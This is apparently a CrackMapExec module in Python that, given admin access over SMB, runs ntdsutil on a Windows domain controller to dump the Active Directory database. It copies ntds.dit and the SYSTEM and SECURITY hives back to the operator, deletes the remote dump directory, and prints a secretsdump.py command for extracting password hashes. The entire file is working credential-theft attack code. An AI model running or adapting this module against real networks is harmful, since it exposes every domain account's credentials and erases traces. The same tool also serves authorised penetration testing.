import os

class CMEModule:
    '''
        Dump NTDS with ntdsutil
        Module by @zblurx

    '''
    name = 'ntdsutil'
    description = 'Dump NTDS with ntdsutil'
    supported_protocols = ['smb']
    opsec_safe= False
    multiple_hosts = False

    def options(self, context, module_options):
        '''
        Dump NTDS with ntdsutil
        Module by @zblurx

        DIR_RESULT  Local dir to write ntds dump
        '''
        self.share = "ADMIN$"
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.tmp_share = self.tmp_dir.split("C:\\Windows\\")[1]
        self.dump_location = 'ntdsutil'
        self.dir_result = 'ntdsutil'

        if 'DIR_RESULT' in module_options:
            self.dir_result = module_options['DIR_RESULT']

        pass


    def on_admin_login(self, context, connection):
        command = "powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full %s%s' q q\"" % (self.tmp_dir, self.dump_location)
        context.log.info('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir,self.dump_location))
        context.log.debug('Executing command {}'.format(command))
        p = connection.execute(command, True)
        context.log.debug(p)
        if 'success' in p:
            context.log.success("NTDS.dit dumped to %s%s" % (self.tmp_dir, self.dump_location))
        else:
            context.log.error("Error while dumping NTDS")
            return

        if not os.path.isdir(self.dir_result):
            os.makedirs(self.dir_result, exist_ok=True)
            os.makedirs(os.path.join(self.dir_result, 'Active Directory'), exist_ok=True)
            os.makedirs(os.path.join(self.dir_result, 'registry'), exist_ok=True)

        context.log.info("Copying NTDS dump to %s" % self.dir_result)
        context.log.debug('Copy ntds.dit to host')
        with open(os.path.join(self.dir_result,'Active Directory','ntds.dit'), 'wb+') as dump_file:
            try:
                connection.conn.getFile(self.share, self.tmp_share + self.dump_location + "\\" + 'Active Directory\\ntds.dit', dump_file.write)
                context.log.debug('Copied ntds.dit file')
            except Exception as e:
                context.log.error('Error while get ntds.dit file: {}'.format(e))

        context.log.debug('Copy SYSTEM to host')
        with open(os.path.join(self.dir_result,'registry','SYSTEM'), 'wb+') as dump_file:
            try:
                connection.conn.getFile(self.share, self.tmp_share + self.dump_location + "\\" + 'registry\\SYSTEM', dump_file.write)
                context.log.debug('Copied SYSTEM file')
            except Exception as e:
                context.log.error('Error while get SYSTEM file: {}'.format(e))

        context.log.debug('Copy SECURITY to host')
        with open(os.path.join(self.dir_result,'registry','SECURITY'), 'wb+') as dump_file:
            try:
                connection.conn.getFile(self.share, self.tmp_share + self.dump_location + "\\" + 'registry\\SECURITY', dump_file.write)
                context.log.debug('Copied SECURITY file')
            except Exception as e:
                context.log.error('Error while get SECURITY file: {}'.format(e))
        context.log.success("NTDS dump copied to %s" % self.dir_result)
        try:
            command = "rmdir /s /q %s%s" % (self.tmp_dir, self.dump_location)
            p = connection.execute(command, True)
            context.log.success('Deleted %s%s dump directory' % (self.tmp_dir, self.dump_location))
        except Exception as e:
            context.log.error('Error deleting {} directory on share {}: {}'.format(self.dump_location, self.share, e))

        context.log.highlight("""Now:
        secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds "%s/Active Directory/ntds.dit" LOCAL"""% (self.dir_result, self.dir_result, self.dir_result))
